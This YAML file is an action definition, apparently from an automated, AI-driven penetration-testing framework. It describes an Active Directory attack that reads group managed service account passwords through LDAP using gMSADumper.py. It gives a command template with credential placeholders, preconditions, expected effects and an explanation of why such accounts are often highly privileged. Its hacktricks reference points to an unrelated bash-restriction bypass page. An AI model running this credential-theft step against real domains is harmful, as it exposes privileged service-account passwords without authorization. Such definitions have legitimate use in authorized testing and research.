name: read_gmsa
category: ad
description: Read gMSA password via LDAP
preconditions:
- domain_joined
- has_cred
parameters:
  target_ip: from_engagement.target_ip
command_template: python3 gMSADumper.py -u '{username}' -p '{password}' -d {domain}
  -l {target_ip}
parser: generic_parser
expected_effects:
- gmsa_password_read
- has_cred
falsifier:
  pattern: error|failed|refused|denied
  timeout: 30
model_tier: haiku
mechanism: gMSA passwords auto-rotated, stored in msDS-ManagedPassword blob. Readable
  by principals in PrincipalsAllowedToRetrieveManagedPassword. Often service accounts
  with high privileges.
hacktricks_ref: linux-hardening/bypass-bash-restrictions/README.md
